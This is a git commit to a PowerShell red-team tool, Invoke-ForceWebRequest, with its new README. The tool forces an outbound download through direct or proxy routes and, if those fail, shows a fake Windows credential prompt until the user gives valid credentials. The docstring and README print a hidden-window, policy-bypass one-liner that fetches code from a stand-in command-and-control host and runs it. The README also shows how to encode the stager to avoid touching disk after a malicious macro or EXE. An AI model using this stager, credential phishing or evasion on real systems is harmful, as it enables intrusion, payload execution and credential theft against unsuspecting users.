c16c942ee06deaa9c43a87f8a524d44529fb2e7c
Daniel Ferreira <daniel@ferreira.fm>
2016-06-30 13:00:17 +0200

    adding readme.md and fixing some issues in the function

--- Invoke-ForceWebRequest.ps1
+++ Invoke-ForceWebRequest.ps1
@@ -3,22 +3,65 @@ function Invoke-ForceWebRequest {
     <#
 
     .SYNOPSIS
+        Force HTTP GET in a computer with unknow internet config, trying to download the URL by downloading it directly and if it can't then using default proxy credentials and .pac proxy list. If none o them works, it will trick the user and request his credentials using the Windows default credential prompt.
 
-    .PARAMETER Iterate
+    .PARAMETER URL
+        [String], required=true
+
+        URL to download. e.g.: comandandcontrol.com/payload.txt
+
+    .PARAMETER DummyURL
+        [String], required=false
+
+        URL to download with some DummyString you know is in there.
+        If you leave it empty, URL parameter will be used as DummyURL. So be sure you use a DummyString that you're for sure is in URL.
+
+    .PARAMETER DummyString
+        [String], required=false
+
+        String that will be cheked if it is in DummyURL URL. We do that because sometimes proxys returns 200 OK to all requested sites but with a fake content.
+        E.g.: use the name of a function you know is in DummyURL.
 
     .OUTPUTS
-    
-    .EXAMPLE
+        [PSObject]
 
+        StatusCode Content
+        ---------- -------
+              200  <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
+
+
+    .EXAMPLE
+        PS C:\> . .\Invoke-ForceWebRequest.ps1
+        PS C:\> Invoke-ForceWebRequest google.com -DummyString html -Verbose
+        VERBOSE: Trying http get with method #1: simple request...
+
+        StatusCode Content
+        ---------- -------
+            200 <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
+    .EXAMPLE
+        From a red-team point of view, running this code on a target machine:
+
+        (assuming you wrote the script in the target computer to $env:temp folder)
+
+        C:\> powershell.exe -ep bypass -windowstyle hidden -nop -noexit -c "gc $env:temp\Invoke-ForceWebRequest.ps1 | out-string | iex; Invoke-ForceWebRequest comandandcontrol.com/payload.txt -DummyString someCode | % { if ($_.StatusCode -eq 200) { $_.Content | out-string | iex } }"
+
+            1: it will download code from URL comandandcontrol.com/payload.txt
+            2: then it will check if the content of payload.txt is correct by checking a dummy-string that you know is inside payload.txt
+            3: invoke (run) code of payload.txt (if you're a redteamer it will be some malicious code)
+    .LINK
+        https://github.com/daniel0x00/forcewebrequest
+        https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1 by @enigma0x3
     #>
     [CmdletBinding()]
     [OutputType([psobject])]
     param(
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory=$true,
+                   ValueFromPipeline=$true,
+                   Position=0)]
         [String]
         $URL,
 
-        [Parameter(Mandatory=$true)]
+        [Parameter(Mandatory=$false)]
         [String]
         $DummyURL,
 
@@ -29,7 +72,7 @@ function Invoke-ForceWebRequest {
     begin {
         # Modified version of 'Invoke-LoginPrompt' by @enigma0x3
         # https://github.com/enigma0x3/Invoke-LoginPrompt/blob/master/Invoke-LoginPrompt.ps1
-        function Invoke-LoginPrompt{
+        function Invoke-LoginPrompt {
             do {
                 $cred = $Host.ui.PromptForCredential("Windows Security", "Invalid Credentials, Please try again", "$env:userdomain\$env:username","")
                 $username = "$env:username"
@@ -131,24 +174,31 @@ function Invoke-ForceWebRequest {
     }
     process {
         # Ensure URLs contains at least an 'http' protocol:
-        if (-not ($URL -match "http")) { $URL = 'http://'+$URL; Write-Verbose "New URL: $URL" }
-        if (-not ($DummyURL -match "http")) { $DummyURL = 'http://'+$DummyURL; Write-Verbose "New DummyURL: $DummyURL" }
+        if (-not ($URL -match "http")) { $URL = 'http://'+$URL }
+        if (!$DummyURL) { $DummyURL = $URL }
+        if (-not ($DummyURL -match "http")) { $DummyURL = 'http://'+$DummyURL }
 
         # 1: no-proxy webrequest
         Write-Verbose "Trying http get with method #1: simple request..."
         $request = Invoke-BasicWebRequest $DummyURL
-        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+        if ($request | select -first 1 | % { $_.content -match $DummyString }) { 
+            $request = Invoke-BasicWebRequest $URL
+            return
+        }
 
         # getting basic proxy settiongs
         $proxy_settings     = Get-ItemProperty 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
         $proxy_server       = $proxy_settings | % { $_.ProxyServer }
         $proxy_auto_url     = $proxy_settings | % { $_.AutoConfigURL }
-        $proxy_pac_regex    = "PROXY\s+(?<proxy>[A-Za-z0-9\.]+\:\d{1,5})"
+        $proxy_pac_regex    = "PROXY\s+(?<proxy>[A-Za-z0-9\.\-\_]+\:\d{1,5})"
 
         # 2: basic-server webrequest
         Write-Verbose "Trying http get with method #2: request with just URL proxy ($proxy_server)..."
-        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server
-        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+        $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server -ProxyDefaultCredentials
+        if ($request | select -first 1 | % { $_.content -match $DummyString }) {
+            $request = Invoke-BasicWebRequest $URL -ProxyURL $proxy_server -ProxyDefaultCredentials
+            return
+        }
 
         # 3: .pac webrequest
         if ($proxy_auto_url -ne $null) {
@@ -162,7 +212,10 @@ function Invoke-ForceWebRequest {
 
                     Write-Verbose "Trying http get with method #3: request with just URL proxy from .pac file ($proxy_server_pac)..."
                     $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac
-                    if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+                    if ($request | select -first 1 | % { $_.content -match $DummyString }) {
+                        $request = Invoke-BasicWebRequest $URL -ProxyURL $proxy_server_pac
+                        return
+                    }
                 }
             }
         }
@@ -178,7 +231,10 @@ function Invoke-ForceWebRequest {
             # 4.1: request with the default proxy URL and credentials.
             Write-Verbose "Trying http get with method #4.1: request with URL proxy ($proxy_server) and $username credential..."
             $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server -ProxyUser $username -ProxyPassword $password
-            if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+            if ($request | select -first 1 | % { $_.content -match $DummyString }) {
+                $request = Invoke-BasicWebRequest $URL -ProxyURL $proxy_server -ProxyUser $username -ProxyPassword $password
+                return
+            }
 
             # 4.2: request with the .pac proxys URLs and credentials.
             if ($proxy_auto_url -ne $null) {
@@ -192,7 +248,10 @@ function Invoke-ForceWebRequest {
 
                         Write-Verbose "Trying http get with method #4.2: request with URL proxy from .pac file ($proxy_server_pac) and $username credential..."
                         $request = Invoke-BasicWebRequest $DummyURL -ProxyURL $proxy_server_pac -ProxyUser $username -ProxyPassword $password
-                        if ($request | select -first 1 | % { $_.content -match $DummyString }) { return }
+                        if ($request | select -first 1 | % { $_.content -match $DummyString }) {
+                            $request = Invoke-BasicWebRequest $URL -ProxyURL $proxy_server_pac -ProxyUser $username -ProxyPassword $password
+                            return
+                        }
                     }
                 }
             }
---
+++ README.md
@@ -0,0 +1,59 @@
+# Invoke-ForceWebRequest (@daniel0x00)
+Force HTTP GET in a computer with unknow internet config, trying to download the URL by downloading it directly and if it can't then using default proxy credentials and .pac proxy list. If none o them works, it will trick the user and request his credentials using the Windows default credential prompt.
+
+## Description
+
+Normally this script should be used in a pentest environment, when you're running this code in a target computer where you don't know exactly what is the outbound internet config. Internally, Invoke-ForceWebRequest will use another two functions:
+* Invoke-BasicWebRequest: another function writed by me which allow me to create http webrequest with proxy config. Similar (but very basic) to Invoke-WebRequest native PowerShell function (which is only available on PowerShell v3+).
+* [Invoke-LoginPrompt](https://github.com/enigma0x3/Invoke-LoginPrompt): an improved version of this great function wrote by [@enigma0x3](https://github.com/enigma0x3)
+
+## Usage
+
+Using the function in a computer with no proxy or proxy with no authentication
+```
+PS C:\> . .\Invoke-ForceWebRequest.ps1
+PS C:\> Invoke-ForceWebRequest google.com -DummyString html -Verbose
+VERBOSE: Trying http get with method #1: simple request...
+
+StatusCode Content
+---------- -------
+       200 <!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="es"><head><meta content="IE=edge" http-equiv="X-UA-Co...
+``` 
+
+Using the function in a computer that have an authenticated proxy, user will be prompt for a valid proxy credentials. Note that user will be prompt until he/she writes a valid credential.
+
+![Invoke-ForceWebRequest](http://ferreira.fm/github/invoke-forcewebclient/requesting-credentials.png "cmd and powershell console theme")
+
+When the user writes a valid credential, html will be returned.
+
+![Invoke-ForceWebRequest](http://ferreira.fm/github/invoke-forcewebclient/proxy-enabled.png "cmd and powershell console theme")
+
+ 
+
+From red-team point of view: let's say you are able to run some PowerShell code in the target machine through a VBA Macro or a malicious EXE, but you really don't know how the computer is connected to internet. So you run this payload to be sure you will get response from your target:
+```
+(assuming you wrote the script in the target computer to $env:temp folder)
+
+C:\> powershell.exe -ep bypass -windowstyle hidden -nop -noexit -c "gc $env:temp\Invoke-ForceWebRequest.ps1 | out-string | iex; Invoke-ForceWebRequest comandandcontrol.com/payload.txt -DummyString someCode | % { if ($_.StatusCode -eq 200) { $_.Content | out-string | iex } }"
+
+    1: it will download code from URL comandandcontrol.com/payload.txt
+    2: then it will check if the content of payload.txt is correct by checking a dummy-string that you know is inside payload.txt
+    3: invoke (run) code of payload.txt (if you're a redteamer it will be some malicious code)
+``` 
+
+If you do not want to touch disk, you can also encode the entire function and the payload with [@samratashok](https://github.com/samratashok) nishang [Invoke-Encode](https://github.com/samratashok/nishang/blob/master/Utility/Invoke-Encode.ps1), something like this:
+```
+1: Create a .ps1 file with the following, and call it for example 'temp.ps1'
+    
+    function Invoke-ForceWebRequest { ...... }
+
+    Invoke-ForceWebRequest comandandcontrol.com/payload.txt -DummyString someCode | % { if ($_.StatusCode -eq 200) { $_.Content | out-string | iex } }
+
+2: Encode the entire file with @samratashok Invoke-Encode, which will create an 'encodedcommand.txt' file in your desktop:
+
+    PS C:\> Invoke-Encode -DataToEncode C:\temp.ps1 -OutCommand
+
+3: Copy the content of encodedcommand.txt and then use it in your PS code that you will execute in your target:
+
+    C:\> powershell.exe -ep bypass -windowstyle hidden -nop -noexit -enc "ENCODED_COMMAND"
+``` 
